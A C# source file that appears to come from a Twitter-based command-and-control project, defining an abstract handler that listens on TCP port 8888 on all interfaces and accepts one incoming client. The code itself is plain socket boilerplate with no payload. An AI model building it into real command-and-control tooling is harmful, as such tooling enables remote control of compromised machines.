using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using TwitterCommandAndControl.Core;

namespace TwitterCommandAndControl.Handlers
{
    public abstract class Handler
    {
        protected const int PORT = 8888;

        private static TcpListener listener = null;

        protected static Task<TcpClient> NextClient()
        {
            return Task.Factory.StartNew<TcpClient>(() =>
            {
                try
                {
                    TcpClient client = null;

                    if (listener != null)
                        listener.Stop();

                    listener = new TcpListener(IPAddress.Any, PORT);
                    listener.Start();
                    client = listener.AcceptTcpClient();
                    listener.Stop();
                    return client;
                }
                catch { return null; }
            });
        }
    }
}
